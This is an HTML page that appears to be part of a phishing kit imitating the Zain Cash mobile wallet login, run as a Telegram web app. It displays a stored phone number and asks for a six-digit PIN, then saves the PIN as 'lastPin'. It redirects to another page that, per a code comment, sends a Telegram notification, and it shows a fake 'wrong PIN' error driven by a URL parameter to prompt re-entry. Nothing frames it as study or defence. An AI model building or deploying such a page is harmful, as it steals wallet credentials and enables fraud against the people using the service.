<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>زين كاش - تسجيل الدخول</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }

        .header-box { width: 100%; background: linear-gradient(135deg, #581d72, #a1278a); padding: 40px 20px; color: white; text-align: center; box-sizing: border-box; }

        .main-content { width: 90%; max-width: 400px; margin: 40px auto 0; text-align: center; flex-grow: 1; }

        .footer-box { width: 100%; background: linear-gradient(135deg, #a1278a, #581d72); padding: 50px 20px 30px; color: white; text-align: center; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; box-sizing: border-box; }

        .logo-text { font-size: 32px; font-weight: bold; margin: 0; }
        .sub-text { font-size: 14px; margin-top: 8px; opacity: 0.9; }
        .version-text { font-size: 12px; margin-top: 15px; opacity: 0.8; }
        .terms-text { font-size: 11px; margin-top: 15px; padding: 0 40px; }

        h2 { color: #333; font-size: 22px; margin-bottom: 25px; }

        .phone-display {
            border: 2px solid #8c237e;
            border-radius: 12px;
            padding: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
            font-size: 18px;
            color: #333;
            direction: ltr;
            background: #fcf8ff;
        }

        .pin-label { color: #666; margin-bottom: 20px; font-size: 15px; }

        .pin-container { display: flex; justify-content: center; align-items: center; gap: 8px; direction: ltr; }

        .pin-input-group { display: flex; gap: 6px; }

        .pin-box {
            width: 44px;
            height: 52px;
            border: 1.5px solid #8c237e;
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            outline: none;
            background: #fff;
            color: #333;
        }

        .pin-box:focus {
            border-color: #581d72;
            box-shadow: 0 0 5px rgba(140, 35, 126, 0.3);
        }

        .toggle-eye { cursor: pointer; margin-left: 8px; font-size: 20px; }

        .btn-gal {
            background-color: #e0e0e0;
            color: #fff;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 12px;
            font-size: 16px;
            margin-top: 40px;
            cursor: not-allowed;
            font-weight: bold;
        }

        .btn-gal.active {
            background: linear-gradient(135deg, #8c237e, #581d72);
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(140, 35, 126, 0.25);
        }

        .spacer { height: 40px; }

        .error-banner {
            background-color: #fde8e8;
            color: #e74c3c;
            border: 1px solid #f8b4b4;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 20px;
            display: none;
            text-align: right;
        }
    </style>
</head>

<body>

<div class="header-box">
    <p class="logo-text">زين كاش</p>
    <p class="sub-text">محفظتك المالية الموثوقة</p>
</div>

<div class="main-content">
    <h2>تسجيل الدخول</h2>

    <div id="errorDisplay" class="error-banner"></div>

    <div class="phone-display">
        <span>🇮🇶</span>
        <span id="displayPhone">+964 ...</span>
    </div>

    <p class="pin-label">أدخل رمز الحماية (PIN) المكون من 6 أرقام</p>

    <div class="pin-container">
        <div class="pin-input-group">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        </div>
        <span class="toggle-eye" id="eyeIcon">👁️</span>
    </div>

    <button id="loginBtn" class="btn-gal" disabled>تسجيل الدخول</button>
    <div class="spacer"></div>
</div>

<div class="footer-box">
    <p class="logo-text">زين كاش</p>
    <p class="sub-text">الخدمات المالية الرقمية في العراق</p>
    <p class="version-text">v2.1.3P</p>
    <p class="terms-text">باستمرارك، فإنك توافق على <u>الشروط والأحكام</u></p>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const eye = document.getElementById('eyeIcon');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    const savedPhone = localStorage.getItem('phone');
    displayPhone.textContent = savedPhone ? `+964 ${savedPhone}` : "+964 (غير متوفر)";

    // Detect URL parameter tracking redirect values
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'wrongpin') {
        errorDisplay.innerText = "❌ رمز الحماية غير صحيح، يرجى إدخال الرمز الصحيح.";
        errorDisplay.style.display = "block";
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');

            if (box.value && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }

            checkInputs();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const filled = [...pinBoxes].every(b => b.value);
        loginBtn.disabled = !filled;
        loginBtn.classList.toggle('active', filled);
    }

    eye.addEventListener('click', () => {
        const show = pinBoxes[0].type === "password";
        pinBoxes.forEach(b => b.type = show ? "text" : "password");
        eye.textContent = show ? "🫣" : "👁️";
    });

    loginBtn.addEventListener('click', () => {
        if (!savedPhone) return;
        
        // Prevent accidental double clicks by disabling button instantly
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');

        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);

        errorDisplay.style.display = "none";

        // Move instantly to page7.html (letting Page 7 fire the Telegram notification)
        window.location.href = "/page7.html";
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
